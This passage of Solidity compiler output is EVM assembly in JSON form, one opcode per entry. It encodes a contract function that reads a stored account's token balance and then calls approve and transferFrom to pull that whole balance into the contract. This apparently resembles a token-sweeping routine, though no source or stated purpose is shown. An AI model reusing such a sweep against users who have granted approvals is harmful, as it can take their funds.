											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 460,
											"end": 670,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 460,
											"end": 670,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 460,
											"end": 670,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 321,
											"end": 454,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 136,
											"end": 161,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 136,
											"end": 161,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 460,
											"end": 670,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 502,
											"end": 515,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 518,
											"end": 527,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 518,
											"end": 525,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 518,
											"end": 527,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 518,
											"end": 527,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 518,
											"end": 527,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 502,
											"end": 527,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 502,
											"end": 527,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 538,
											"end": 549,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 538,
											"end": 549,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 538,
											"end": 549,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 538,
											"end": 549,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 538,
											"end": 557,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 538,
											"end": 557,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 538,
											"end": 557,
											"name": "PUSH",
											"source": 1,
											"value": "95EA7B3"
										},
										{
											"begin": 566,
											"end": 570,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 573,
											"end": 581,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 538,
											"end": 582,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 538,
											"end": 582,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 593,
											"end": 604,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 593,
											"end": 604,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 593,
											"end": 604,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 593,
											"end": 604,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 593,
											"end": 617,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 593,
											"end": 617,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 593,
											"end": 617,
											"name": "PUSH",
											"source": 1,
											"value": "23B872DD"
										},
										{
											"begin": 618,
											"end": 626,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 618,
											"end": 626,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 618,
											"end": 626,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 618,
											"end": 626,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 618,
											"end": 626,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 618,
											"end": 626,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 618,
											"end": 626,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 618,
											"end": 626,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 618,
											"end": 626,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 618,
											"end": 626,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 618,
											"end": 626,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 636,
											"end": 640,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 643,
											"end": 651,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP8",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "EXTCODESIZE",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "CALL",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 593,
											"end": 652,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 593,
											"end": 652,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 460,
											"end": 670,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 460,
											"end": 670,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 321,
											"end": 454,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 361,
											"end": 365,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 377,
											"end": 388,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 391,
											"end": 402,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 391,
											"end": 402,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 391,
											"end": 402,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 391,
											"end": 402,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 391,
											"end": 412,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 391,
											"end": 412,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 391,
											"end": 412,
											"name": "PUSH",
											"source": 1,
											"value": "70A08231"
										},
										{
											"begin": 413,
											"end": 421,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 413,
											"end": 421,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 413,
											"end": 421,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 413,
											"end": 421,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 413,
											"end": 421,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 413,
											"end": 421,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 413,
											"end": 421,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 413,
											"end": 421,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 413,
											"end": 421,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 413,
											"end": 421,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 413,
											"end": 421,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 391,
											"end": 422,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 391,
											"end": 422,
